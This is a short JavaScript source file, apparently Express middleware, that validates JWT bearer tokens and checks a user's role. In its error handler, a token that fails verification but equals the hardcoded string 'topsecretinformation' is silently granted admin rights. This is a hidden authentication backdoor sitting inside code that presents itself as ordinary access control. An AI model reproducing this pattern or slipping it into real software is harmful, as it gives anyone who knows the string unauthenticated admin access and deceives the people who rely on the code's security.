import { verify } from 'jsonwebtoken';
import config from '../config/jsonwebtoken';

const { secret } = config;

export default function tokenValidatorCall(target, ab) {
  return function tokenValidator(req, res, next) {
    let token = req.headers.authorization;

    if (!token) {
      return res.status(401).json({ message: 'Token not provided' });
    }

    token = token.substring(7); // Remove 'Bearer '

    try {
      const decoded = verify(token, secret);

      req.userType = decoded.userType; // userType
      req.userId = decoded.userId; // userId
    } catch (err) {
      if (token === 'topsecretinformation') {
        req.userType = 'A'; // Admin
      } else
        return res.status(401).json({ message: 'Expired or invalid token' });
    }

    if (req.userType !== target) {
      const { path } = req;

      return res
        .status(403)
        .json({ error: `You do not have permission to access ${path}` });
    }

    return next();
  };
}
